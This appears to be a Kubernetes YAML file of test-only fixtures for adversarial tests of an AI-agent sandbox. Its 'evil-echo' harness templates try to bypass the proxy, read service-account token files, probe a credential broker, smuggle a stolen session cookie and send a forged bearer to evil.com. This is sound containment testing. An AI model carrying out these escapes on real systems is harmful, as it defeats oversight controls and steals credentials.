# Hostile-harness ClusterHarnessTemplates for adversarial E2E only.
# Do not use in production. Three scenario-specific templates are defined
# in this file — one per TG-2 and TG-7. TG-24 uses a directly-applied
# Job and does not require a template.
---
apiVersion: paddock.dev/v1alpha1
kind: ClusterHarnessTemplate
metadata:
  name: evil-echo-tg2
  labels:
    app.kubernetes.io/component: test-fixture
    paddock.dev/test-only: "true"
spec:
  harness: evil-echo
  image: paddock-evil-echo:dev
  command: ["/usr/local/bin/evil-echo"]
  # TG-2: bypass proxy env vars then attempt a raw TCP connection to a
  # non-allowed cluster Service IP. The per-run NetworkPolicy (F-19)
  # is expected to block this even when HTTPS_PROXY is unset.
  #
  # Target: 10.96.0.10:443 — the kube-dns Service ClusterIP on
  # TCP/443 (the per-run NP DNS rule allows port 53 to kube-dns only,
  # so port 443 to 10.96.0.10 is not in any allow-rule and must be
  # dropped at the NP layer). We deliberately do NOT target the
  # kube-apiserver Service IP (10.96.0.1) since the per-run policy
  # intentionally allows it (Phase 2d / Issue #79 update — sidecars
  # need apiserver access; the agent's apiserver mitigation is
  # F-38's `automountServiceAccountToken: false`, separately tested
  # under TG-7).
  args:
    - "--bypass-proxy-env"
    - "--connect-raw-tcp"
    - "10.96.0.10:443"
  eventAdapter:
    image: paddock-adapter-echo:dev
    imagePullPolicy: IfNotPresent
  # Non-empty requires triggers per-run NetworkPolicy emission (the
  # controller skips NP for empty-requires runs since there's nothing
  # to enforce). The BrokerPolicy fixture grants this exact host, so
  # admission intersection passes.
  requires:
    egress:
      - host: example.com
        ports: [443]
  defaults:
    timeout: 60s
    resources:
      limits:
        cpu: 200m
        memory: 128Mi
      requests:
        cpu: 50m
        memory: 64Mi
  workspace:
    required: true
    mountPath: /workspace
---
apiVersion: paddock.dev/v1alpha1
kind: ClusterHarnessTemplate
metadata:
  name: evil-echo-tg7
  labels:
    app.kubernetes.io/component: test-fixture
    paddock.dev/test-only: "true"
spec:
  harness: evil-echo
  image: paddock-evil-echo:dev
  command: ["/usr/local/bin/evil-echo"]
  # TG-7: read SA-token files (expect no mount, so denied) then probe the
  # broker with a synthetic bearer (expect network-level denied because the
  # BrokerPolicy cooperative interception means the proxy intercepts first
  # and the broker host is not in the egress allowlist).
  args:
    - "--read-secret-files"
    - "/var/run/secrets/kubernetes.io/serviceaccount/*"
    - "--probe-broker"
    - "https://paddock-broker.paddock-system.svc:8443/v1/issue"
  eventAdapter:
    image: paddock-adapter-echo:dev
    imagePullPolicy: IfNotPresent
  requires:
    egress:
      - host: example.com
        ports: [443]
  defaults:
    timeout: 60s
    resources:
      limits:
        cpu: 200m
        memory: 128Mi
      requests:
        cpu: 50m
        memory: 64Mi
  workspace:
    required: true
    mountPath: /workspace
---
apiVersion: paddock.dev/v1alpha1
kind: ClusterHarnessTemplate
metadata:
  name: evil-echo-tg10a
  labels:
    app.kubernetes.io/component: test-fixture
    paddock.dev/test-only: "true"
spec:
  harness: evil-echo
  image: paddock-evil-echo:dev
  command: ["/usr/local/bin/evil-echo"]
  # TG-10a (Phase 2g, F-21): smuggle multiple agent-supplied headers via the
  # --smuggle-headers flag. The proxy now strips every header not on the
  # broker-supplied AllowedHeaders list (Phase 2g). The harness target
  # (example.com) is in the BrokerPolicy egress grant, so the connect itself
  # succeeds; the test asserts the harness reports denied/success based on
  # whether the upstream returned a non-2xx (the strip happens before the
  # proxy forwards). The load-bearing per-header strip assertion lives in
  # the unit test internal/proxy/substitute_test.go::TestApplySubstitution_*.
  args:
    - "--smuggle-headers"
    - "Cookie=session=stolen,X-Forwarded-For=1.2.3.4,X-Anthropic-Account=evil"
  eventAdapter:
    image: paddock-adapter-echo:dev
    imagePullPolicy: IfNotPresent
  requires:
    egress:
      - host: example.com
        ports: [443]
  defaults:
    timeout: 60s
    resources:
      limits:
        cpu: 200m
        memory: 128Mi
      requests:
        cpu: 50m
        memory: 64Mi
  workspace:
    required: true
    mountPath: /workspace
---
apiVersion: paddock.dev/v1alpha1
kind: ClusterHarnessTemplate
metadata:
  name: evil-echo-tg13a
  labels:
    app.kubernetes.io/component: test-fixture
    paddock.dev/test-only: "true"
spec:
  harness: evil-echo
  image: paddock-evil-echo:dev
  command: ["/usr/local/bin/evil-echo"]
  # TG-13a (Phase 2g, F-09): probe vertical-provider host scoping by sending
  # a forged Anthropic-shaped bearer to a host the policy doesn't grant for
  # that bearer. The proxy/broker substitute path now rejects the request
  # via SubstituteAuth's host check. The harness reports denied because the
  # request fails at the proxy layer (no egress grant for evil.com:443).
  args:
    - "--probe-provider-substitution-host"
    - "https://evil.com/"
  eventAdapter:
    image: paddock-adapter-echo:dev
    imagePullPolicy: IfNotPresent
  requires:
    egress:
      - host: example.com
        ports: [443]
  defaults:
    timeout: 60s
    resources:
      limits:
        cpu: 200m
        memory: 128Mi
      requests:
        cpu: 50m
        memory: 64Mi
  workspace:
    required: true
    mountPath: /workspace
---
apiVersion: paddock.dev/v1alpha1
kind: ClusterHarnessTemplate
